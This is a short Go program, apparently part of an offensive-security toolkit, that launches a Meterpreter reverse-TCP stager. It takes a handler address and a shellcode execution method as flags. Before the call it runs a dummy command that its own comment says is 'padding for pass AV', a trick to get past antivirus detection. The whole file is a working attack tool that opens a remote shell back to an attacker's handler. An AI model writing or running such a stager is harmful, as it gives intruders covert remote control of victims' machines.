package main

import (
	"flag"
	"fmt"
	"os/exec"

	"project/internal/module/spawn/meterpreter"
)

func main() {
	var (
		network string
		address string
		method  string
	)
	flag.StringVar(&network, "n", "tcp", "network")
	flag.StringVar(&address, "a", "127.0.0.1:8990", "handler address")
	flag.StringVar(&method, "m", "", "shellcode execute method")
	flag.Parse()

	// padding for pass AV
	exec.Command("test")

	err := meterpreter.ReverseTCP(network, address, method)
	if err != nil {
		fmt.Println(err)
	}
}
